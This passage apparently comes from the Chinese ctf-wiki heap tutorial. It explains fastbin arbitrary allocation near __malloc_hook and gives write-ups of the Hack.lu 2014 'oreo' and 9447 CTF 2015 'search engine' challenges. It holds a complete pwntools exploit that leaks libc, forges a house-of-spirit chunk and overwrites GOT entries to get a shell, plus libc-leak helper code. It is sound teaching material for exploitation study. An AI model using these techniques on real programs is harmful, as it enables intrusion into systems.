\u4e8b\u5b9e\u4e0a\u53ea\u8981\u6ee1\u8db3\u76ee\u6807\u5730\u5740\u5b58\u5728\u5408\u6cd5\u7684 size \u57df\uff08\u8fd9\u4e2a size \u57df\u662f\u6784\u9020\u7684\uff0c\u8fd8\u662f\u81ea\u7136\u5b58\u5728\u7684\u90fd\u65e0\u59a8\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u628a chunk \u5206\u914d\u5230\u4efb\u610f\u7684\u53ef\u5199\u5185\u5b58\u4e2d\uff0c\u6bd4\u5982bss\u3001heap\u3001data\u3001stack\u7b49\u7b49\u3002 \u6f14\u793a \u00b6 \u5728\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u4f7f\u7528\u5b57\u8282\u9519\u4f4d\u6765\u5b9e\u73b0\u76f4\u63a5\u5206\u914d fastbin \u5230 _malloc_hook\u7684\u4f4d\u7f6e\uff0c\u76f8\u5f53\u4e8e\u8986\u76d6_malloc_hook\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u3002 int main(void) { void *chunk1; void *chunk_a; chunk1=malloc(0x60); free(chunk1); *(long long *)chunk1=0x7ffff7dd1af5-0x8; malloc(0x60); chunk_a=malloc(0x60); return 0; } \u8fd9\u91cc\u76840x7ffff7dd1af5\u662f\u6211\u6839\u636e\u672c\u673a\u7684\u60c5\u51b5\u5f97\u51fa\u7684\u503c\uff0c\u8fd9\u4e2a\u503c\u662f\u600e\u4e48\u83b7\u5f97\u7684\u5462\uff1f\u9996\u5148\u6211\u4eec\u8981\u89c2\u5bdf\u6b32\u5199\u5165\u5730\u5740\u9644\u8fd1\u662f\u5426\u5b58\u5728\u53ef\u4ee5\u5b57\u8282\u9519\u4f4d\u7684\u60c5\u51b5\u3002 0x7ffff7dd1a88 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1a90 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1a98 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1aa0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1aa8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ab0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ab8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ac0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ac8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ad0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ad8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ae0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1ae8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0 0x7ffff7dd1af8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0 0x7ffff7dd1b08 0x0 0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0 0x7ffff7dd1b10 <__malloc_hook>: 0x30 0x28 0xa9 0xf7 0xff 0x7f 0x0 0x0 0x7ffff7dd1b10 \u662f\u6211\u4eec\u60f3\u8981\u63a7\u5236\u7684 __malloc_hook \u7684\u5730\u5740\uff0c\u4e8e\u662f\u6211\u4eec\u5411\u4e0a\u5bfb\u627e\u662f\u5426\u53ef\u4ee5\u9519\u4f4d\u51fa\u4e00\u4e2a\u5408\u6cd5\u7684size\u57df\u3002\u56e0\u4e3a\u8fd9\u4e2a\u7a0b\u5e8f\u662f 64 \u4f4d\u7684\uff0c\u56e0\u6b64 fastbin \u7684\u8303\u56f4\u4e3a32\u5b57\u8282\u5230128\u5b57\u8282(0x20-0x80)\uff0c\u5982\u4e0b\uff1a //\u8fd9\u91cc\u7684size\u6307\u7528\u6237\u533a\u57df\uff0c\u56e0\u6b64\u8981\u5c0f2\u500dSIZE_SZ Fastbins[idx=0, size=0x10] Fastbins[idx=1, size=0x20] Fastbins[idx=2, size=0x30] Fastbins[idx=3, size=0x40] Fastbins[idx=4, size=0x50] Fastbins[idx=5, size=0x60] Fastbins[idx=6, size=0x70] \u901a\u8fc7\u89c2\u5bdf\u53d1\u73b0 0x7ffff7dd1af5 \u5904\u53ef\u4ee5\u73b0\u5b9e\u9519\u4f4d\u6784\u9020\u51fa\u4e00\u4e2a0x000000000000007f 0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0 0x7ffff7dd1af8 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x0 0x7ffff7dd1af5 <_IO_wide_data_0+309>: 0x000000000000007f \u56e0\u4e3a 0x7f \u5728\u8ba1\u7b97 fastbin index \u65f6\uff0c\u662f\u5c5e\u4e8e index 5 \u7684\uff0c\u5373 chunk \u5927\u5c0f\u4e3a 0x70 \u7684\u3002 ##define fastbin_index(sz) \\ ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2) \uff08\u6ce8\u610fsz\u7684\u5927\u5c0f\u662funsigned int\uff0c\u56e0\u6b64\u53ea\u53604\u4e2a\u5b57\u8282\uff09 \u800c\u5176\u5927\u5c0f\u53c8\u5305\u542b\u4e86 0x10 \u7684 chunk_header\uff0c\u56e0\u6b64\u6211\u4eec\u9009\u62e9\u5206\u914d 0x60 \u7684 fastbin\uff0c\u5c06\u5176\u52a0\u5165\u94fe\u8868\u3002 \u6700\u540e\u7ecf\u8fc7\u4e24\u6b21\u5206\u914d\u53ef\u4ee5\u89c2\u5bdf\u5230 chunk \u88ab\u5206\u914d\u5230 0x7ffff7dd1afd\uff0c\u56e0\u6b64\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236 malloc_hook\u7684\u5185\u5bb9(\u5728\u6211\u7684libc\u4e2d realloc_hook\u4e0e__malloc_hook\u662f\u5728\u8fde\u5728\u4e00\u8d77\u7684)\u3002 0x4005a8 <main+66> call 0x400450 <malloc@plt> \u2192 0x4005ad <main+71> mov QWORD PTR [rbp-0x8], rax $rax : 0x7ffff7dd1afd 0x7ffff7dd1aed <_IO_wide_data_0+301>: 0xfff7dd0260000000 0x000000000000007f 0x7ffff7dd1afd: 0xfff7a92e20000000 0xfff7a92a0000007f 0x7ffff7dd1b0d <__realloc_hook+5>: 0x000000000000007f 0x0000000000000000 0x7ffff7dd1b1d: 0x0000000000000000 0x0000000000000000 \u5c0f\u603b\u7ed3 \u00b6 Arbitrary Alloc \u5728 CTF \u4e2d\u7528\u5730\u66f4\u52a0\u9891\u7e41\u3002\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5b57\u8282\u9519\u4f4d\u7b49\u65b9\u6cd5\u6765\u7ed5\u8fc7 size \u57df\u7684\u68c0\u9a8c\uff0c\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5206\u914d chunk\uff0c\u6700\u540e\u7684\u6548\u679c\u4e5f\u5c31\u76f8\u5f53\u4e8e\u4efb\u610f\u5730\u5740\u5199\u4efb\u610f\u503c\u3002 2014 hack.lu oreo \u00b6 \u57fa\u672c\u5206\u6790 \u00b6 \u279c 2014_Hack.lu_oreo git: ( master ) file oreo oreo: ELF 32 -bit LSB executable, Intel 80386 , version 1 ( SYSV ) , dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2 .6.26, BuildID [ sha1 ]= f591eececd05c63140b9d658578aea6c24450f8b, stripped \u279c 2014_Hack.lu_oreo git: ( master ) checksec oreo [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_spirit/2014_Hack.lu_oreo/oreo' Arch: i386-32-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) \u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u786e\u5b9e\u662f\u6bd4\u8f83\u8001\u7684\uff0c32\u4f4d\u7a0b\u5e8f\uff0c\u52a8\u6001\u94fe\u63a5\uff0c\u5c31\u8fde RELRO \u6280\u672f\u4e5f\u6ca1\u6709\u4e0a\u3002 \u57fa\u672c\u529f\u80fd \u00b6 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8be5\u7a0b\u5e8f\u5e76\u6ca1\u6709\u8fdb\u884c setvbuf \u64cd\u4f5c\uff0c\u56e0\u6b64\u5728\u521d\u6b21\u6267\u884c io \u51fd\u6570\u65f6\uff0c\u4f1a\u5728\u5806\u4e0a\u5206\u914d\u7a7a\u95f4\u3002 \u6b63\u5982\u7a0b\u5e8f\u4e2d\u76f4\u63a5\u8f93\u51fa\u7684\u4fe1\u606f\uff0c\u7a0b\u5e8f\u4e3b\u8981\u662f\u4e00\u4e2a\u539f\u59cb\u7684\u5728\u7ebf\u67aa\u652f\u7cfb\u7edf\u3002\u5176\u4e2d\uff0c\u6839\u636e\u6dfb\u52a0\u67aa\u652f\u7684\u8fc7\u7a0b\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u67aa\u652f\u7684\u57fa\u672c\u7ed3\u6784\u5982\u4e0b 00000000 rifle struc ; ( sizeof = 0x38 , mappedto_5 ) 00000000 descript db 25 dup ( ? ) 0000001 9 name db 27 dup ( ? ) 00000034 next dd ? ; offset 0000003 8 rifle ends \u7a0b\u5e8f\u7684\u57fa\u672c\u529f\u80fd\u5982\u4e0b \u6dfb\u52a0\u67aa\u652f\uff0c\u5176\u4e3b\u8981\u4f1a\u8bfb\u53d6\u67aa\u652f\u7684\u540d\u5b57\u4e0e\u63cf\u8ff0\u3002\u4f46\u95ee\u9898\u5728\u4e8e\u8bfb\u53d6\u7684\u540d\u5b57\u7684\u957f\u5ea6\u8fc7\u957f\uff0c\u53ef\u4ee5\u8986\u76d6 next \u6307\u9488\u4ee5\u53ca\u540e\u9762\u5806\u5757\u7684\u6570\u636e\u3002\u53ef\u4ee5\u8986\u76d6\u540e\u9762\u5806\u5757\u7684\u6570\u636e\u5927\u5c0f\u4e3a 56-(56-27)=27 \u5927\u5c0f\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e9b\u67aa\u652f\u7684\u5927\u5c0f\u90fd\u662f\u5728fastbin \u8303\u56f4\u5185\u7684\u3002 \u5c55\u793a\u6dfb\u52a0\u67aa\u652f\uff0c\u5373\u4ece\u5934\u5230\u5c3e\u8f93\u51fa\u67aa\u652f\u7684\u63cf\u8ff0\u4e0e\u540d\u5b57\u3002 \u8ba2\u5df2\u7ecf\u9009\u62e9\u7684\u67aa\u652f\uff0c\u5373\u5c06\u6240\u6709\u5df2\u7ecf\u6dfb\u52a0\u7684\u67aa\u652f\u91ca\u653e\u6389\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u7f6e\u4e3aNULL\u3002 \u7559\u4e0b\u8ba2\u8d27\u6d88\u606f \u5c55\u793a\u76ee\u524d\u72b6\u6001\uff0c\u5373\u6dfb\u52a0\u4e86\u591a\u5c11\u53ea\u67aa\uff0c\u8ba2\u4e86\u591a\u5c11\u5355\uff0c\u7559\u4e0b\u4e86\u4ec0\u4e48\u4fe1\u606f\u3002 \u4e0d\u96be\u5206\u6790\u5f97\u5230\uff0c\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u4e3b\u8981\u5b58\u5728\u4e8e\u6dfb\u52a0\u67aa\u652f\u65f6\u7684\u5806\u6ea2\u51fa\u6f0f\u6d1e\u3002 \u5229\u7528 \u00b6 \u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b \u7531\u4e8e\u7a0b\u5e8f\u5b58\u5728\u5806\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u800c\u4e14\u8fd8\u53ef\u4ee5\u63a7\u5236 next \u6307\u9488\uff0c\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236 next \u6307\u9488\u6307\u5411\u7a0b\u5e8f\u4e2d got \u8868\u7684\u4f4d\u7f6e\u3002\u5f53\u8fdb\u884c\u5c55\u793a\u7684\u65f6\u5019\uff0c\u5373\u53ef\u4ee5\u8f93\u51fa\u5bf9\u5e94\u7684\u5185\u5bb9\uff0c\u8fd9\u91cc\u540c\u65f6\u9700\u8981\u786e\u4fdd\u5047\u8bbe\u5bf9\u5e94\u5730\u5740\u4e3a\u4e00\u4e2a\u67aa\u652f\u7ed3\u6784\u4f53\u65f6\uff0c\u5176 next \u6307\u9488\u4e3a NULL\u3002\u8fd9\u91cc\u6211\u91c7\u7528 puts@got\u3002\u901a\u8fc7\u8fd9\u6837\u7684\u64cd\u4f5c\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u5f97\u51fa libc \u57fa\u5730\u5740\uff0c\u4ee5\u53ca system \u51fd\u6570\u5730\u5740\u3002 \u7531\u4e8e\u67aa\u652f\u7ed3\u6784\u4f53\u5927\u5c0f\u662f 0x38 \u5927\u5c0f\uff0c\u6240\u4ee5\u5176\u5bf9\u5e94\u7684 chunk \u4e3a 0x40\u3002\u8fd9\u91cc\u91c7\u7528 house of sprit \u7684\u6280\u672f\u6765\u8fd4\u56de 0x0804A2A8 \u5904\u7684chunk\uff0c\u5373\u7559\u4e0b\u7684\u6d88\u606f\u7684\u6307\u9488\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u9700\u8981\u8bbe\u7f6e 0x0804A2A4 \u5904\u7684\u5185\u5bb9\u4e3a 0x40\uff0c\u5373\u9700\u8981\u6dfb\u52a0 0x40 \u652f\u67aa\u652f\uff0c\u4ece\u800c\u7ed5\u8fc7\u5927\u5c0f\u68c0\u6d4b\u3002\u540c\u65f6\u4e3a\u4e86\u786e\u4fdd\u53ef\u4ee5\u7ed5\u8fc7 next chunk \u7684\u68c0\u6d4b\uff0c\u8fd9\u91cc\u6211\u4eec\u7f16\u8f91\u7559\u4e0b\u7684\u6d88\u606f\u3002 \u5728\u6210\u529f\u5206\u914d\u8fd9\u6837\u7684 chunk \u540e\uff0c\u6211\u4eec\u5176\u5b9e\u5c31\u6709\u4e86\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u4fee\u6539\u7684\u6f0f\u6d1e\uff0c\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u4fee\u6539\u4e00\u4e2a\u5408\u9002\u7684 got \u9879\u4e3a system \u5730\u5740\uff0c\u4ece\u800c\u83b7\u5f97 shell\u3002 \u5177\u4f53\u4ee3\u7801\u5982\u4e0b from pwn import * context . terminal = [ 'gnome-terminal' , '-x' , 'sh' , '-c' ] if args [ 'DEBUG' ]: context . log_level = 'debug' context . binary = \"./oreo\" oreo = ELF ( \"./oreo\" ) if args [ 'REMOTE' ]: p = remote ( ip , port ) else : p = process ( \"./oreo\" ) log . info ( 'PID: ' + str ( proc . pidof ( p )[ 0 ])) libc = ELF ( './libc.so.6' ) def add ( descrip , name ): p . sendline ( '1' ) #p.recvuntil('Rifle name: ') p . sendline ( name ) #p.recvuntil('Rifle description: ') #sleep(0.5) p . sendline ( descrip ) def show_rifle (): p . sendline ( '2' ) p . recvuntil ( '=================================== \\n ' ) def order (): p . sendline ( '3' ) def message ( notice ): p . sendline ( '4' ) #p.recvuntil(\"Enter any notice you'd like to submit with your order: \") p . sendline ( notice ) def exp (): print 'step 1. leak libc base' name = 27 * 'a' + p32 ( oreo . got [ 'puts' ]) add ( 25 * 'a' , name ) show_rifle () p . recvuntil ( '=================================== \\n ' ) p . recvuntil ( 'Description: ' ) puts_addr = u32 ( p . recvuntil ( ' \\n ' , drop = True )[: 4 ]) log . success ( 'puts addr: ' + hex ( puts_addr )) libc_base = puts_addr - libc . symbols [ 'puts' ] system_addr = libc_base + libc . symbols [ 'system' ] binsh_addr = libc_base + next ( libc . search ( '/bin/sh' )) print 'step 2. free fake chunk at 0x0804A2A8' # now, oifle_cnt=1, we need set it = 0x40 oifle = 1 while oifle < 0x3f : # set next link=NULL add ( 25 * 'a' , 'a' * 27 + p32 ( 0 )) oifle += 1 payload = 'a' * 27 + p32 ( 0x0804a2a8 ) # set next link=0x0804A2A8, try to free a fake chunk add ( 25 * 'a' , payload ) # before free, we need to bypass some check # fake chunk's size is 0x40 # 0x20 *'a' for padding the last fake chunk # 0x40 for fake chunk's next chunk's prev_size # 0x100 for fake chunk's next chunk's size # set fake iofle' next to be NULL payload = 0x20 * ' \\x00 ' + p32 ( 0x40 ) + p32 ( 0x100 ) payload = payload . ljust ( 52 , 'b' ) payload += p32 ( 0 ) payload = payload . ljust ( 128 , 'c' ) message ( payload ) # fastbin 0x40: 0x0804A2A0->some where heap->NULL order () p . recvuntil ( 'Okay order submitted! \\n ' ) print 'step 3. get shell' # modify free@got to system addr payload = p32 ( oreo . got [ 'strlen' ]) . ljust ( 20 , 'a' ) add ( payload , 'b' * 20 ) log . success ( 'system addr: ' + hex ( system_addr )) #gdb.attach(p) message ( p32 ( system_addr ) + ';/bin/sh \\x00 ' ) p . interactive () if __name__ == \"__main__\" : exp () \u5f53\u7136\uff0c\u8be5\u9898\u76ee\u4e5f\u53ef\u4ee5\u4f7f\u7528 fast bin attack \u4e2d\u7684\u5176\u5b83\u6280\u672f\u6765\u5b9e\u73b0\uff0c\u53ef\u53c2\u8003\u53c2\u8003\u6587\u732e\u4e2d\u7684\u94fe\u63a5\u3002 2015 9447 CTF : Search Engine \u00b6 \u57fa\u672c\u4fe1\u606f \u00b6 \u279c 2015_9447ctf_search-engine git: ( master ) file search search: ELF 64 -bit LSB executable, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.24, BuildID [ sha1 ]= 4f5b70085d957097e91f940f98c0d4cc6fb3343f, stripped \u279c 2015_9447ctf_search-engine git: ( master ) checksec search [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2015_9447ctf_search-engine/search' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) FORTIFY: Enabled \u57fa\u672c\u529f\u80fd \u00b6 \u7a0b\u5e8f\u7684\u57fa\u672c\u529f\u80fd\u662f \u7d22\u5f15\u4e00\u4e2a\u53e5\u5b50 \u5927\u5c0fv0\uff0c(unsigned int)(v0 - 1) > 0xFFFD \u8bfb\u53d6\u7684\u5b57\u7b26\u4e32\u957f\u5ea6\u5fc5\u987b\u548c\u7ed9\u5b9a\u7684\u5927\u5c0f\u76f8\u7b49 \u6bcf\u6b21\u7d22\u5f15\u7684\u53e5\u5b50\u90fd\u662f\u76f4\u63a5\u5728\u76f4\u63a5\u5efa\u7acb\u5728\u524d\u9762\u7684\u53e5\u5b50\u4e0a\u7684\u3002 \u5728\u4e00\u4e2a\u53e5\u5b50\u4e2d\u641c\u7d22\u5355\u8bcd \u5927\u5c0fv0\uff0c(unsigned int)(v0 - 1) > 0xFFFD \u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u5b57\u7b26\u4e32 \u5982\u679c\u6709\u56de\u8f66\u6807\u8bb0 \u5728\u6307\u5b9a\u957f\u5ea6\u5185\u6ca1\u6709\u9047\u5230\u56de\u8f66\uff0c\u5219\u8bfb\u5b8c\u6ca1\u6709\u8bbe\u7f6eNULL\u6807\u8bb0 \u5728\u6307\u5b9a\u957f\u5ea6\u5185\u9047\u5230\u56de\u8f66\uff0c\u5c31\u622a\u65ad\u8fd4\u56de\u3002 \u6ca1\u6709\u56de\u8f66\u6807\u8bb0 \u8bfb\u591f\u6307\u5b9a\u957f\u5ea6\uff0c\u6ca1\u6709NULL\u6807\u8bb0\u7ed3\u5c3e\u3002 \u8bcd\u8bed\u7ed3\u6784\u4f53 \u00b6 \u901a\u8fc7\u5206\u6790\u7d22\u5f15\u53e5\u5b50\u7684\u8fc7\u7a0b\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u8bcd\u8bed\u7684\u7ed3\u6784\u5982\u4e0b 00000000 word_struct struc ; (sizeof=0x28, mappedto_6) 00000000 content dq ? 00000008 size dd ? 0000000C padding1 dd ? 00000010 sentence_ptr dq ? ; offset 00000018 len dd ? 0000001C padding2 dd ? 00000020 next dq ? ; offset 00000028 word_struct ends \u5806\u5185\u5b58\u76f8\u5173\u64cd\u4f5c \u00b6 \u5206\u914d malloc 40 \u5b57\u8282\u4e3a\u4e00\u4e2aword\u7ed3\u6784\u4f53 \u4e3a\u53e5\u5b50\u6216\u8005\u5355\u8bcd malloc \u6307\u5b9a\u5927\u5c0f\u3002 \u91ca\u653e \u91ca\u653e\u5220\u9664\u7684\u53e5\u5b50 \u91ca\u653e\u5220\u9664\u53e5\u5b50\u6240\u641c\u7d22\u7684\u4e34\u65f6\u5355\u8bcd \u91ca\u653e\u7d22\u5f15\u53e5\u5b50\u65f6\u672a\u4f7f\u7528\u7684\u5355\u8bcd\u7ed3\u6784 \u6f0f\u6d1e \u00b6 \u7d22\u5f15\u53e5\u5b50\u8bfb\u53d6\u5b57\u7b26\u4e32\u65f6\u65e0NULL\u7ed3\u5c3e \u5728\u7d22\u5f15\u53e5\u5b50\u65f6 flag_enter \u6c38\u8fdc\u4e3a 0\uff0c\u6240\u4ee5\u8bfb\u53d6\u53e5\u5b50\u65f6\u6700\u540e\u6ca1\u6709 NULL \u7ed3\u5c3e\u3002 _flag_enter = flag_enter ; v4 = 0 ; while ( 1 ) { v5 = & s [ v4 ]; v6 = fread ( & s [ v4 ], 1uLL , 1uLL , stdin ); if ( v6 <= 0 ) break ; if ( * v5 == '\\n' && _flag_enter ) { if ( v4 ) { * v5 = 0 ; return ; } v4 = v6 - 1 ; if ( len <= v6 - 1 ) break ; } else { v4 += v6 ; if ( len <= v4 ) break ; } } \u8bfb\u53d6\u9009\u62e9\u64cd\u4f5c\u6570 __int64 read_num () { __int64 result ; // rax char * endptr ; // [rsp+8h] [rbp-50h] char nptr ; // [rsp+10h] [rbp-48h] unsigned __int64 v3 ; // [rsp+48h] [rbp-10h] v3 = __readfsqword ( 0x28u ); read_str ( & nptr , 48 , 1 ); result = strtol ( & nptr , & endptr , 0 ); if ( endptr == & nptr ) { __printf_chk ( 1LL , \"%s is not a valid number \\n \" , & nptr ); result = read_num (); } __readfsqword ( 0x28u ); return result ; } \u56e0\u4e3a read_str \u4e0d\u8bbe\u7f6eNULL \uff0c\u56e0\u6b64\uff0c\u5982\u679c nptr \u8bfb\u53d6\u7684\u4e0d\u5408\u6cd5\u7684\u8bdd\uff0c\u5c31\u6709\u53ef\u80fd\u4f1a leak \u51fa\u6808\u4e0a\u7684\u5185\u5bb9\u3002 \u7d22\u5f15\u53e5\u5b50\u91ca\u653e\u672a\u7f6eNULL else { free ( v6 ); } \u641c\u7d22\u8bcd\u8bed\u4e2d\u5220\u9664\u8bcd\u8bed\u65f6\uff0c\u5bf9\u5e94\u53e5\u5b50\u6307\u9488\u53ea\u662f\u91ca\u653e\uff0c\u5e76\u6ca1\u6709\u8bbe\u7f6e\u4e3aNULL for ( i = head ; i ; i = i -> next ) { if ( * i -> sentence_ptr ) { if ( LODWORD ( i -> size ) == v0 && ! memcmp (( const void * ) i -> content , v1 , v0 ) ) { __printf_chk ( 1LL , \"Found %d: \" , LODWORD ( i -> len )); fwrite ( i -> sentence_ptr , 1uLL , SLODWORD ( i -> len ), stdout ); putchar ( '\\n' ); puts ( \"Delete this sentence (y/n)?\" ); read_str ( & choice , 2 , 1 ); if ( choice == 'y' ) { memset ( i -> sentence_ptr , 0 , SLODWORD ( i -> len )); free ( i -> sentence_ptr ); puts ( \"Deleted!\" ); } } } } free ( v1 ); \u53ef\u4ee5\u770b\u51fa\uff0c\u5728\u6bcf\u6b21\u91ca\u653e i->sentence_ptr \u4e4b\u524d\uff0c\u8fd9\u4e2a\u53e5\u5b50\u7684\u5185\u5bb9\u5c31\u4f1a\u5168\u90e8\u88ab\u8bbe\u7f6e\u4e3a \\x00 \uff0c\u7531\u4e8e\u5355\u8bcd\u7ed3\u6784\u4f53\u4e2d\u5b58\u50a8\u7684\u5355\u8bcd\u53ea\u662f\u53e5\u5b50\u7684\u4e00\u4e2a\u6307\u9488\uff0c\u6240\u4ee5\u5355\u8bcd\u4e5f\u4f1a\u88ab\u7f6e\u4e3a \\x00 \u3002\u8be5\u53e5\u5b50\u5bf9\u5e94\u7684\u90a3\u4e9b\u5355\u8bcd\u4ecd\u7136\u662f\u5b58\u5728\u4e8e\u94fe\u8868\u4e2d\u7684\uff0c\u5e76\u6ca1\u6709\u88ab\u5220\u9664\uff0c\u56e0\u6b64\u6bcf\u6b21\u641c\u7d22\u5355\u8bcd\u7684\u65f6\u5019\uff0c\u4ecd\u7136\u4f1a\u5224\u65ad\u3002\u770b\u8d77\u6765\u7531\u4e8e\u53e5\u5b50\u5185\u5bb9\u88ab\u7f6e\u4e3a \\x00 \u53ef\u4ee5\u9632\u6b62\u901a\u8fc7 *i->sentence_ptr \u9a8c\u8bc1\u3002\u7136\u800c\uff0c\u7531\u4e8e chunk \u88ab\u91ca\u653e\u540e\u4f1a\u88ab\u653e\u5230 bin \u4e2d\uff0c\u5f53 chunk \u4e0d\u662f fastbin \u6216\u8005 chunk \u88ab\u91cd\u65b0\u5206\u914d\u51fa\u53bb\u4f7f\u7528\u7684\u65f6\u5019\uff0c\u4e5f\u5c31\u6709\u53ef\u80fd\u4f1a\u4ea7\u751f double free \u7684\u60c5\u51b5\u3002\u6b64\u5916\uff0c\u5f53\u53e5\u5b50\u88ab memset \u7684\u65f6\u5019\uff0c\u5355\u8bcd\u867d\u7136\u90fd\u53d8\u4e3a\u4e86 \\x00 \uff0c\u4f46\u662f\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u901a\u8fc7\u4e24\u4e2a \\x00 \u7684\u6bd4\u8f83\u6765\u7ed5\u8fc7 memcmp \u7684\u68c0\u6d4b\u3002 \u5229\u7528 \u00b6 \u5229\u7528\u601d\u8def \u00b6 \u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b \u5229\u7528 unsorted bin \u5730\u5740\u6cc4\u6f0f libc \u57fa\u5730\u5740 \u5229\u7528 double free \u6784\u9020 fastbin \u5faa\u73af\u94fe\u8868 \u5206\u914d chunk \u5230 malloc_hook \u9644\u8fd1\uff0c\u4fee\u6539malloc_hook \u4e3a one_gadget \u6cc4\u6f0f libc \u5730\u5740 \u00b6 \u8fd9\u91cc\u6211\u4eec\u5206\u914d\u4e00\u4e2a small bin \u5927\u5c0f\u7684 chunk \uff0c\u5f53\u5b83\u88ab\u91ca\u653e\u540e\uff0c\u5c31\u4f1a\u653e\u5165\u5230 unsorted bin \u4e2d\u3002\u56e0\u800c\uff0c\u53ea\u8981 unsorted bin \u7684\u5730\u5740\u7684\u8d77\u59cb\u5b57\u8282\u4e0d\u662f \\x00 \u4fbf\u53ef\u4ee5\u901a\u8fc7\u9a8c\u8bc1\u3002\u540c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u6784\u9020 \\x00 \u6765\u8fdb\u884c\u6bd4\u8f83\uff0c\u4ece\u800c\u901a\u8fc7\u9a8c\u8bc1\u3002\u5177\u4f53\u5982\u4e0b def leak_libc (): smallbin_sentence = 's' * 0x85 + ' m ' index_sentence ( smallbin_sentence ) search_word ( 'm' ) p . recvuntil ( 'Delete this sentence (y/n)? \\n ' ) p . sendline ( 'y' ) search_word ( ' \\x00 ' ) p . recvuntil ( 'Found ' + str ( len ( smallbin_sentence )) + ': ' ) unsortedbin_addr = u64 ( p . recv ( 8 )) p . recvuntil ( 'Delete this sentence (y/n)? \\n ' ) p . sendline ( 'n' ) return unsortedbin_addr \u6784\u9020 fastbin \u5faa\u73af\u94fe\u8868 \u00b6 \u7531\u4e8e\u6211\u4eec\u6700\u540e\u5e0c\u671b\u5728 malloc_hook \u5904\u5206\u914d chunk\uff0c\u800c\u4e00\u822c\u5206\u914d malloc_hook \u9644\u8fd1\u7684 chunk \u4e00\u822c\u5927\u5c0f\u90fd\u662f0x7f\u3002\u5373\uff0c\u6211\u4eec\u6240\u9700\u8981\u8bbe\u7f6e\u7684\u8bbe\u7f6e\u7684 fast bin \u7684\u6570\u636e\u5b57\u8282\u90e8\u5206\u7684\u5927\u5c0f\u4e3a 0x60\u3002\u8fd9\u91cc\u6211\u4eec\u6309\u7167\u5982\u4e0b\u65b9\u5f0f\u6784\u9020 \u5206\u522b\u7d22\u5f15\u53e5\u5b50a\uff0c\u7d22\u5f15\u53e5\u5b50b\uff0c\u7d22\u5f15\u53e5\u5b50c\uff0c\u5219\u6b64\u65f6\u5355\u8bcd\u94fe\u8868\u4e2d\u7d22\u5f15\u7684\u53e5\u5b50\u7684\u76f8\u5bf9\u987a\u5e8f\u4e3ac->b->a\u3002\u5047\u8bbe\u53e5\u5b50 a \u4e3a'a' * 0x5d+' d '\uff0c\u53e5\u5b50 b \u4e3a 'b' * 0x5d+' d '\uff0c\u53e5\u5b50c\u7c7b\u4f3c\u3002 \u7d22\u5f15\u5355\u8bcdd\uff0c\u4e09\u4e2a\u5747\u5220\u9664\uff0c\u5219\u6b64\u65f6 fastbin \u4e2d\u7684\u94fe\u8868\u60c5\u51b5\u4e3a a->b->c->NULL\uff0c\u8fd9\u662f\u56e0\u4e3a\u9996\u5148\u91ca\u653e\u7684\u662f\u53e5\u5b50c\uff0c\u6700\u540e\u91ca\u653e\u7684\u662f\u53e5\u5b50 a \u3002\u8fd9\u65f6\uff0c\u641c\u7d22\u5355\u8bcd\u65f6 *i->sentence_ptr 